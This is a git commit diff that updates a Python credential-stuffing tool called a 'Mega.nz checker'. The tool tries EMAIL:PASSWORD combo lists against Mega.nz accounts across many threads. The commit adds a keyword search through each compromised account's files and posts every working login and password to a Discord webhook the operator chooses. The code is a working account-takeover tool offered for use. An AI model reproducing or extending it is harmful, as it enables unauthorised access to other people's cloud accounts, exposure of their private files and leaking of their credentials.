ba3f0cf7dd94bbedb447d3a361ba7dd00adc4cbc
Nikola Arbov <49321625+Arboff@users.noreply.github.com>
2023-01-04 12:20:31 -0800

    Bug Fixes
    Removed bug where the program would suddenly crash at a certain account. Issue was caused by not adding "UTF-8" coding when reading the files.
    
    ADDED:
    
    Added CURRENT/TOTAL counter on top
    Added a counter for Hits / Fails / Customs on the top of the status bar.
    Added functionality to look for keyword in the account upon HIT
    Added String Position in Hit message
    Added TRUE/FALSE keyword flag on hits
    
    Visual Improvements.
    Recompiled .exe

--- main.py
+++ main.py
@@ -1,7 +1,6 @@
 from mega import Mega
 from func import create_txt, fail, hit, logo, custom, error
 from multiprocessing.pool import ThreadPool as Pool
-import random
 import os
 from discord_webhook import DiscordWebhook
 from datetime import datetime
@@ -13,28 +12,46 @@ global hits
 
 create_txt()
 
+print("\n=========================================================================================================================\n")
 
 input("Place your combo inside combo.txt in format EMAIL:PASSWORD and press enter.")
-with open("combo.txt", "r") as g:
+with open("combo.txt", "r", encoding="utf-8") as g:
     lines = g.readlines()
     size = len(lines)
     g.close()
 print(f"\n{size} lines detected.\n")
 pool_size = 10
+print("\n=========================================================================================================================\n")
+
 try:
     pool_size = int(input("Enter how many threads you want to use. Default count is 10. More threads can lead to errors and skipping hits: "))
 except Exception as e:
     print("\nInput not valid. Setting default count of threads to 10.")
     pool_size = 10
 
+
+
 print(f"\nThread Count: [{pool_size}]")
+
+print("\n=========================================================================================================================\n")
 
 name = input("\nDefine filename: ")
 
-
-
 filename = f"hits_{name}.txt"
-print(f"\nHits will be saved to {filename}\n")
+print(f"\nHits will be saved to {filename}")
+
+print("\n=========================================================================================================================\n")
+
+search_string = input("\nDefine a word to look for inside the Account. Leave blank if you dont need word lookup: ")
+
+if search_string == "":
+    print("\nNo search String selected. Value will return FALSE\n")
+else:
+    print(f"\nKeyword selected: [ {search_string} ]. If found, value on hit will return TRUE.\n")
+
+print("\n=========================================================================================================================\n")
+
+
 
 webhook_Custom = input("If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank: ")
 
@@ -44,54 +61,73 @@ else:
     print("\nWebhook Attached. Hits will be sent to webhook aswell. You will get a test message right now.\n")
     webhook = DiscordWebhook(
         url=webhook_Custom,
-        content="Webhook Successfully attached. Mega.nz checker by https://github.com/arboff")
+        content=f"Webhook Successfully attached | Mega.nz checker by https://github.com/arboff | Combo Lines: {size} | Export name: {name} | Waiting for start.")
     response = webhook.execute()
 
+print("\n=========================================================================================================================\n")
 
 input("Press Enter to begin checking. Tool coded by https://github.com/Arboff.\n\n")
 
 
 
 
+checked = 0
+hits = 0
+customs = 0
+fails = 0
 
 
-
-checked = 1
 
 def check(username, password):
+    global checked
+    global hits
+    global customs
+    global fails
+    tab_name = f"title Mega.nz Checker by Arboff // Checked: [{checked} / {size}] // Hit: [{hits}] // Custom: [{customs}] // Fail: [{fails}]"
     mega = Mega()
+    os.system(tab_name)
     try:
         m = mega.login(username, password)
-        quota = m.get_quota()
         space = m.get_storage_space(giga=True)
         used = space["used"]
         used = round(used,2)
         total = space["total"]
+        files = str(m.get_files())
+        found = False
+        if str(search_string) in files and str(search_string) != "":
+            found = True
+        else:
+            found = False
 
-        hit_str = (f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Filename: {name} | Bots Count: {pool_size} | Combo Count: {size} | Local Time: {datetime.now()}")
-        print(f"{hit()} {username}:{password} | Used Space: {used}GB | Total Space: {total}GB")
+        hit_str = (f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Filename: {name} | Bots Count: {pool_size} | Combo Count: {size} | Local Time: {datetime.now()} | Keyword Match: {str(found).upper()} | String Position in Array: {checked} / {size}")
+        print(f"{hit()} {username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Keyword Match: {str(found).upper()}")
+
+
+        hits += 1
         try:
             webhook = DiscordWebhook(
                 url=webhook_Custom,
                 content=hit_str)
             response = webhook.execute()
         except:
-            print(f"{error()} Webhook Error.")
+            print(f"{error()} Webhook Error / Not Added.")
 
         with open(filename, "a") as e:
-            e.writelines(f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB")
+            e.writelines(f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB\n")
             hits += 1
             e.close()
 
     except Exception as e:
         if "User blocked" in str(e):
             print(f"{custom()} {username}:{password} is blocked.")
+            customs += 1
         else:
             print(f"{fail()} {username}:{password} is not valid.")
-
+            fails += 1
+    checked += 1
 pool = Pool(pool_size)
 
-with open("combo.txt", "r") as f:
+with open("combo.txt", "r", encoding="utf-8") as f:
     lines = f.readlines()
 
 
